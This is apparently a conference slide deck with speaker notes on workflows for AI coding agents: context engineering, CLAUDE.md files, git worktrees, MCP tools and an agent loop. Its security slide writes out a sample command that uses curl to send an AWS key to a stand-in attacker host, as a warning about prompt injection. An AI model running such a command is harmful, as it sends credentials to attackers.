---
theme: seriph
title: ai-data-dump
class: text-center
transition: fade
mdc: true
duration: 8min
---

# ai-data-dump

<div class="text-2xl text-gray-400 mt-12">
"LLMs are calculator's for words"
</div>

<div class="text-lg text-gray-500 mt-6">
— Simon Willison
</div>

<!--
Set the mental model. Just like calculators changed math education
(you still need to understand math, but the tedious computation is handled),
LLMs change coding (you still need to understand code, but generation is handled).
They are stateless - no memory between calls.
-->

---



<div class="mt-8 font-mono text-left mx-auto" style="max-width: 400px;">

```bash
sam@tlv:~$ whoami
```
```
-----------
name: sam brink
title: ['builder', 'photographer']
web: www.sam-brink.com
```

</div>

---

# ERPI Workflow

- **Epic** — Define the problem clearly, avoid ambiguity
- **Research** — Explore codebase, understand patterns
- **Plan** — Design before implementation
- **Implement** — Execute with agent assistance

<div class="mt-6 text-xl font-semibold">
Specs are contracts! READ THEM
</div>

<!--
This is the workflow. Each phase has different tool usage.
Research phase is critical - agent reads code, you direct where to look.
Plan phase produces a detailed implementation plan - this is where you review.
Implement phase is mostly agent-driven with human checkpoints.
One-shotting leads to slop.
Specs are contracts - they define the agreement between you and the agent.
-->

---
layout: two-cols
layoutClass: gap-8
---

# Context Engineering

Context engineering is having the most relevant tokens in the context window for current task.

<div class="text-amber-400 font-bold mt-2 mb-4">Important</div>

- Knowledge is POWER
- Aim for 40-50% max usage
- Layered CLAUDE.md files
- `/context` to visualize
- `/clear` to reset
- `/compact` command
- Protect your context

::right::

<div class="mt-8">

**Layered knowledge / Lazy Loading Context**

```
project/
  CLAUDE.md           # Global rules
  src/
    CLAUDE.md         # Frontend patterns
    api/
      CLAUDE.md       # API conventions
```

</div>

<!--
Think of context window as RAM. You're the memory manager.
CLAUDE.md files are like .editorconfig but for AI. They persist knowledge
across sessions. Layer them by directory for context-specific rules.
Stale memory files are your biggest enemy when trying to be productive.
-->

---

# Security

- **Sandboxing** — Run Coding Agents in a isolated environment (Docker Sandbox, VPS, YOLO)
- **Prompt injection** — Untrusted input can hijack agents
- **Network access** — `curl attacker.com?secret=$AWS_KEY`

<!--
Brief but important. Prompt injection is the XSS of AI.
If your agent processes user input, that input could contain instructions.
Sandboxing prevents damage from hallucinated shell commands.
The dev machine is an attack surface - a lot of code will move off personal machines.
-->

---

# Git Worktrees & Parallelism

```bash
git worktree add ../project-feature-a feature-a
git worktree add ../project-feature-b feature-b
```

- Each coding agent gets its own directory
- Sharing same origin (.git), different branches 
- Notes on VibeKaban


---

# Tooling

<div class="flex justify-start mt-8">
<div>

- Context7 — up-to-date docs
- WebMCP — fetch any URL, control the browser natively
- Playwright MCP — browser automation
- FigmaMCP — design specs
- GitHub CLI — issues, PRs
- and more...

</div>
</div>

<!--
MCP is Model Context Protocol. Standardizes how LLMs connect to external tools.
These are the ones I use daily. Context7 is a game-changer for avoiding
outdated documentation hallucinations.
MCPs can bloat context - sometimes custom project scripts are better.
-->

---

# Agent control-flow aka Ralph Wiggum Loop



```bash
do {
  claude -p "@prds.json @progress.md work on the highest-priority task and when complete update tasks status"
} while (prd.json.length);
```
<div class="mt-5">
```bash
llm -p "@implementation_plan.md @convert_to_prd_json_prompt"

# pseudo-prompt 
"Convert my feature requirements into structured PRD items. Each item should have: category, description, skills, mcps, steps_to_verify, and passes: false. Format as JSON. Be specific about acceptance criteria."

Example format: { "category": "Frontend", "description": "Add Freeze User Button", "skills": ["@newEndpoint"], "mcps": ["playwrightmcp"], "steps_to_verify": [ "Playwright MCP skill go to admin page and click user actions", "Verify API request for freeze user succeeds", "Check User can not login" ], "passes": false }
```


</div>



<!--
Ralph Wiggum meme reference. The agent is the kid on the bus saying "I'm helping!"
You need checkpoints for git push, file deletion, etc.
This pseudo code represents the actual control flow of most coding agents.
-->

---
layout: center
class: text-center
---

<div class="text-6xl text-gray-500 animate-pulse">
🦀 Live demo follows 🦀
</div>

<!--
Keep this up during Q&A. Blog post has more detail.
Transition to live demo of the actual workflow.
-->
